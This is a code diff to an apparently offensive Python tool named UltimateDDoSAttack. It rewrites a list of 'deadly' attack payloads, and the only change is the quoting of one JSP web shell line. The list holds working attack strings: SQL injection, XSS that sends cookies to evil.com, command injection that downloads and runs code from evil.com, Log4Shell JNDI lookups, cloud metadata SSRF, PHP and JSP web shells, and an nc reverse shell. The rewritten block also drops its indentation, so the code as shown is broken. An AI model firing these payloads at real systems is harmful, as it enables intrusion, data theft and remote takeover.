@@ -105,75 +105,76 @@ class UltimateDDoSAttack:
         ]
         
         # ULTIMATE MEMATIKAN PAYLOADS
-        self.malicious_payloads = [
-            # SQL Injection MEMATIKAN
-            "' OR '1'='1' -- -",
-            "' UNION SELECT username,password FROM users--",
-            "' AND 1=1; EXEC master..xp_cmdshell('ping 127.0.0.1')--",
-            "' OR EXISTS(SELECT * FROM information_schema.tables)--",
-            "' UNION SELECT NULL,CONCAT(username,0x3a,password) FROM users--",
-            
-            # XSS MEMATIKAN
-            "<script>fetch('http://evil.com/steal?cookie='+btoa(document.cookie))</script>",
-            "<img src=x onerror=\"this.src='http://evil.com/log?data='+encodeURIComponent(document.documentElement.innerHTML)\">",
-            "<svg onload=\"fetch('http://evil.com/exploit?url='+btoa(window.location.href))\">",
-            
-            # Path Traversal MEMATIKAN
-            "../../../../../../../../../../etc/passwd",
-            "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd",
-            "....//....//....//....//....//....//etc/passwd",
-            
-            # Command Injection MEMATIKAN
-            "|curl http://evil.com/malware.sh | sh",
-            "; wget http://evil.com/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd",
-            "`wget http://evil.com/exploit -O /tmp/e && bash /tmp/e`",
-            
-            # Log4J & RCE MEMATIKAN
-            "${jndi:ldap://evil.com:1389/Exploit}",
-            "${${env:ENV_NAME:-jndi}:${env:ENV_NAME:-ldap}://evil.com/#Exploit}",
-            "${${lower:jndi}:${lower:ldap}://evil.com/${sys:java.version}}",
-            
-            # SSRF MEMATIKAN
-            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-            "http://localhost:9200/_search?q=*",
-            "http://127.0.0.1:5984/_utils/",
-            "gopher://127.0.0.1:25/xHELO%20evil.com",
-            
-            # Buffer Overflow MEMATIKAN
-            "A" * 10000 + "\x00" * 500 + "B" * 5000,
-            "%0a%0d" * 5000,
-            "\x00" * 10000,
-            
-            # JSON Injection MEMATIKAN
-            '{"__proto__":{"isAdmin":true,"toString":"1337"}}',
-            '{"constructor":{"prototype":{"polluted":"yes"}}}',
-            '{"__proto__":{"toString":"console.log(1337)"}}',
-            
-            # Template Injection MEMATIKAN
-            "${7*7*7}",
-            "{{config.items()}}",
-            "<%= File.open('/etc/passwd').read %>",
-            "${T(java.lang.Runtime).getRuntime().exec('calc')}",
-            
-            # HTTP Smuggling MEMATIKAN
-            "POST / HTTP/1.1\r\nHost: evil.com\r\nContent-Length: 44\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
-            "GET / HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
-            
-            # Open Redirect MEMATIKAN
-            "https://google.com@evil.com",
-            "//evil.com/%2f..",
-            "http://evil.com/?next=https://target.com",
-            
-            # Metasploit Style Payloads
-            "<?php system($_GET['cmd']); ?>",
-            "<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>",
-            "|nc -e /bin/sh evil.com 4444",
-            
-            # Advanced SQLi
-            "' AND (SELECT * FROM (SELECT(SLEEP(10)))a)--",
-            "'%20WAITFOR%20DELAY%20'0:0:10'--",
-            "' UNION SELECT 1,LOAD_FILE('/etc/passwd')--"
-        ]
+         # ULTIMATE MEMATIKAN PAYLOADS
+self.malicious_payloads = [
+    # SQL Injection MEMATIKAN
+    "' OR '1'='1' -- -",
+    "' UNION SELECT username,password FROM users--",
+    "' AND 1=1; EXEC master..xp_cmdshell('ping 127.0.0.1')--",
+    "' OR EXISTS(SELECT * FROM information_schema.tables)--",
+    "' UNION SELECT NULL,CONCAT(username,0x3a,password) FROM users--",
+    
+    # XSS MEMATIKAN
+    "<script>fetch('http://evil.com/steal?cookie='+btoa(document.cookie))</script>",
+    "<img src=x onerror=\"this.src='http://evil.com/log?data='+encodeURIComponent(document.documentElement.innerHTML)\">",
+    "<svg onload=\"fetch('http://evil.com/exploit?url='+btoa(window.location.href))\">",
+    
+    # Path Traversal MEMATIKAN
+    "../../../../../../../../../../etc/passwd",
+    "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd",
+    "....//....//....//....//....//....//etc/passwd",
+    
+    # Command Injection MEMATIKAN
+    "|curl http://evil.com/malware.sh | sh",
+    "; wget http://evil.com/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd",
+    "`wget http://evil.com/exploit -O /tmp/e && bash /tmp/e`",
+    
+    # Log4J & RCE MEMATIKAN
+    "${jndi:ldap://evil.com:1389/Exploit}",
+    "${${env:ENV_NAME:-jndi}:${env:ENV_NAME:-ldap}://evil.com/#Exploit}",
+    "${${lower:jndi}:${lower:ldap}://evil.com/${sys:java.version}}",
+    
+    # SSRF MEMATIKAN
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://localhost:9200/_search?q=*",
+    "http://127.0.0.1:5984/_utils/",
+    "gopher://127.0.0.1:25/xHELO%20evil.com",
+    
+    # Buffer Overflow MEMATIKAN
+    "A" * 10000 + "\x00" * 500 + "B" * 5000,
+    "%0a%0d" * 5000,
+    "\x00" * 10000,
+    
+    # JSON Injection MEMATIKAN
+    '{"__proto__":{"isAdmin":true,"toString":"1337"}}',
+    '{"constructor":{"prototype":{"polluted":"yes"}}}',
+    '{"__proto__":{"toString":"console.log(1337)"}}',
+    
+    # Template Injection MEMATIKAN
+    "${7*7*7}",
+    "{{config.items()}}",
+    "<%= File.open('/etc/passwd').read %>",
+    "${T(java.lang.Runtime).getRuntime().exec('calc')}",
+    
+    # HTTP Smuggling MEMATIKAN
+    "POST / HTTP/1.1\r\nHost: evil.com\r\nContent-Length: 44\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
+    "GET / HTTP/1.1\r\nHost: localhost\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
+    
+    # Open Redirect MEMATIKAN
+    "https://google.com@evil.com",
+    "//evil.com/%2f..",
+    "http://evil.com/?next=https://target.com",
+    
+    # Metasploit Style Payloads - PERBAIKAN DI SINI
+    "<?php system($_GET['cmd']); ?>",
+    "<% Runtime.getRuntime().exec(request.getParameter('cmd')); %>",  # PERBAIKAN: gunakan single quote
+    "|nc -e /bin/sh evil.com 4444",
+    
+    # Advanced SQLi
+    "' AND (SELECT * FROM (SELECT(SLEEP(10)))a)--",
+    "'%20WAITFOR%20DELAY%20'0:0:10'--",
+    "' UNION SELECT 1,LOAD_FILE('/etc/passwd')--"
+]
 
     def generate_proxy_list(self):
         """Generate advanced proxy list"""
